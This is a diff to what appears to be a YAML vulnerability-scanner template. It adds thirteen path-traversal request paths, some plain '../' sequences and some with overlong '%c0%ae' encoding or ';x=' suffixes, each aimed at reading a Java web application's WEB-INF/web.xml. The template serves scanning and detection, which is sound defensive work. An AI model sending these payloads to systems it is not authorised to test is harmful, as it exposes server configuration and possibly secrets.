@@ -12,7 +12,19 @@ brief:
 moves:
     - verb: GET
       to:
-        - '{{BaseURL}}{{paths}}'
+        - '{{BaseURL}}/../../../../WEB-INF/web.xml'
+        - '{{BaseURL}}/../../../WEB-INF/web.xml'
+        - '{{BaseURL}}/../../WEB-INF/web.xml'
+        - '{{BaseURL}}/%c0%ae/%c0%ae/WEB-INF/web.xml'
+        - '{{BaseURL}}/%c0%ae/%c0%ae/%c0%ae/WEB-INF/web.xml'
+        - '{{BaseURL}}/%c0%ae/%c0%ae/%c0%ae/%c0%ae/WEB-INF/web.xml'
+        - '{{BaseURL}}/../../../WEB-INF/web.xml;x='
+        - '{{BaseURL}}/../../WEB-INF/web.xml;x='
+        - '{{BaseURL}}/../WEB-INF/web.xml;x='
+        - '{{BaseURL}}/WEB-INF/web.xml'
+        - '{{BaseURL}}/.//WEB-INF/web.xml'
+        - '{{BaseURL}}/../WEB-INF/web.xml'
+        - '{{BaseURL}}/%c0%ae/WEB-INF/web.xml'
       signs:
         - "on": word
           has:
